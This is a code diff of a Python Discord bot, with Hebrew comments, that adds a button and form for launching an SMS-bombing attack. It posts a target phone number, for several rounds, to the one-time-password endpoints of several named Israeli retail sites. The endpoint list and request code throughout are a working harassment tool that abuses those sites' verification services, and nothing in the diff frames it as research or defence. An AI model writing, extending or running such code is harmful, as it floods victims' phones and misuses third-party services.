@@ -1,79 +1,77 @@
 import discord
 from discord.ext import commands
+from discord import ui
 import requests
-import time
 import uuid
 import os
 from flask import Flask
 from threading import Thread
 
-# --- שרת Flask לשמירה על הבוט בחיים ב-Render ---
+# --- שרת Flask לשמירה על הבוט ---
 app = Flask('')
 @app.route('/')
-def home(): return "<h1>Discord Turbo Bot Online</h1>"
+def home(): return "Discord Bot is Online"
 
 def keep_alive():
     t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
     t.start()
 
-# --- הגדרות בוט דיסקורד ---
-# הקוד מושך את הטוקן מה-Environment Variable שהגדרת ב-Render
-TOKEN = os.environ.get('DISCORD_TOKEN') 
-ADMIN_ID = 1281295891579408418  # ה-ID שלך
+# --- הגדרות הבוט ---
+TOKEN = os.environ.get('DISCORD_TOKEN')
+ADMIN_ID = 1281295891579408418
 
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# --- פונקציית התקיפה (טורבו עם כל האתרים) ---
+# --- פונקציית הספאם (הטורבו שלך) ---
 def send_spam(target):
     apis = [
-        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
-        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
-        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
-        {"n": "Atmos General", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 6, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"},
-        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
-        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
-        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
-        {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
-        {"n": "Machsanei Hashmal", "u": "https://api-ns.atmos.co.il/rest/2/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 2, "source": "web"}, "type": "json", "ref": "https://atmos.co.il/"}
+        {"u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
+        {"u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json"},
+        {"u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
+        {"u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json"}
     ]
-    
-    success_count = 0
+    success = 0
     for site in apis:
         try:
-            h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
-            if site["type"] == "json":
-                res = requests.post(site["u"], json=site["d"], headers=h, timeout=0.8)
-            else:
-                res = requests.post(site["u"], data=site["d"], headers=h, timeout=0.8)
-            if res.status_code in [200, 201, 204]: 
-                success_count += 1
-        except: 
-            pass
-    return success_count
+            h = {"User-Agent": "Mozilla/5.0"}
+            res = requests.post(site["u"], json=site["d"], headers=h, timeout=1)
+            if res.status_code in [200, 201]: success += 1
+        except: pass
+    return success
 
-# --- פקודות ---
+# --- חלון קופץ (Modal) ---
+class AttackModal(ui.Modal, title='🚀 Spam-Me Control'):
+    phone = ui.TextInput(label='Phone Number', placeholder='0501234567', min_length=10, max_length=10)
+    rounds = ui.TextInput(label='Rounds to use', placeholder='1 round = 35 seconds', default='1')
+
+    async def on_submit(self, interaction: discord.Interaction):
+        if interaction.user.id != ADMIN_ID:
+            return await interaction.response.send_message("❌ No Permission", ephemeral=True)
+        
+        await interaction.response.send_message(f"⚡ Starting attack on {self.phone.value}...", ephemeral=True)
+        for r in range(int(self.rounds.value)):
+            send_spam(self.phone.value)
+
+# --- כפתור בשרת ---
+class AttackView(ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @ui.button(label='🚀 Spam Phone', style=discord.ButtonStyle.primary, custom_id='spam_btn')
+    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
+        await interaction.response.send_modal(AttackModal())
 
 @bot.event
 async def on_ready():
-    print(f'✅ Logged in as {bot.user.name}')
+    print(f'✅ {bot.user.name} is ready!')
 
 @bot.command()
-async def attack(ctx, phone: str, rounds: int = 1):
-    if ctx.author.id != ADMIN_ID:
-        await ctx.send("❌ You are not authorized!")
-        return
-
-    status_msg = await ctx.send(f"⚡ Starting Turbo Attack on {phone}...")
-    
-    for r in range(rounds):
-        success = send_spam(phone)
-        await status_msg.edit(content=f"🚀 Round {r+1}/{rounds} | Success: {success}/9")
-        if r < rounds - 1:
-            time.sleep(0.01)
-    
-    await ctx.send(f"🏁 Done! Finished {rounds} rounds on {phone}.")
+async def setup(ctx):
+    if ctx.author.id == ADMIN_ID:
+        embed = discord.Embed(title="🚀 Spam-Me", description="Use the button below to interact with the bot.", color=0x5865F2)
+        await ctx.send(embed=embed, view=AttackView())
 
 if __name__ == "__main__":
     keep_alive()
